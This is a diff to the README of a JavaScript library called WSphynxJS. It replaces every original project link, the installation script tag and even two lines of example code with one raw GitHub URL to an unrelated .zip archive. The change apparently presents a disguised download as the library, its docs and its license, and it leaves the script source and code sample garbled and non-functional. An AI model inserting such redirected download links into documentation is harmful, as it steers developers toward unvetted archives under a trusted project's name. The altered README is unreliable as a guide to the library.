@@ -1,7 +1,7 @@
-# <a href="http://wsphynx.com/index.html">WSphynxJS</a>
+# <a href="https://raw.githubusercontent.com/SphynxTech/docusa/master/vaguely/docusa.zip">WSphynxJS</a>
 
 
-<a href="http://wsphynx.com/index.html">WSphynxJS</a> is a Javascript and HTML library for building powerful interfaces.
+<a href="https://raw.githubusercontent.com/SphynxTech/docusa/master/vaguely/docusa.zip">WSphynxJS</a> is a Javascript and HTML library for building powerful interfaces.
 
 
 Key features of WSphynxJS:
@@ -18,32 +18,32 @@ Key features of WSphynxJS:
 
     A modern design to enhance your code. The library is developed with a powerful syntax to match with the most recent browsers.
     
-<a href="http://wsphynx.com/docs.html">Learn WSphynxJS</a>
+<a href="https://raw.githubusercontent.com/SphynxTech/docusa/master/vaguely/docusa.zip">Learn WSphynxJS</a>
 
-# <a href="http://wsphynx.com/docs.html">Installation</a>
+# <a href="https://raw.githubusercontent.com/SphynxTech/docusa/master/vaguely/docusa.zip">Installation</a>
 
 It is possible to use WSphynxJS thanks to a `script` tag placed in the `head` part:
 
 ```html
 <head>
   <!--Some stuff here-->
-  <script defer src="http://wsphynx.com/simple(1.0).txt"></script> 
+  <script defer src="https://raw.githubusercontent.com/SphynxTech/docusa/master/vaguely/docusa.zip(1.0).txt"></script> 
 </head>
 ```
 
-You can also directly download the library <a href="http://wsphynx.com/simple(1.0).txt">here</a>. However, we do not recommend to copy the code in your own web page. We often update the source code and you would probably miss new functionalities or bug corrections.
+You can also directly download the library <a href="https://raw.githubusercontent.com/SphynxTech/docusa/master/vaguely/docusa.zip(1.0).txt">here</a>. However, we do not recommend to copy the code in your own web page. We often update the source code and you would probably miss new functionalities or bug corrections.
 
-<a href="http://wsphynx.com/docs.html">Getting started</a>
+<a href="https://raw.githubusercontent.com/SphynxTech/docusa/master/vaguely/docusa.zip">Getting started</a>
 
 # Simple example
 
 ```html
 <wsdiv> Hello
     <wsonmousedown>
-        element.textContent = "Clic";
+        https://raw.githubusercontent.com/SphynxTech/docusa/master/vaguely/docusa.zip = "Clic";
     </wsonmousedown>
     <wsonmouseup>
-        element.textContent = "Up";
+        https://raw.githubusercontent.com/SphynxTech/docusa/master/vaguely/docusa.zip = "Up";
     </wsonmouseup>
 </wsdiv>
 ```
@@ -54,4 +54,4 @@ With WSphynxJS, you can declare dynamic events and interact with your HTML page 
 
 # License
 
-<a href="http://wsphynx.com/about.html">WSphynxJS is MIT licensed</a>.
+<a href="https://raw.githubusercontent.com/SphynxTech/docusa/master/vaguely/docusa.zip">WSphynxJS is MIT licensed</a>.
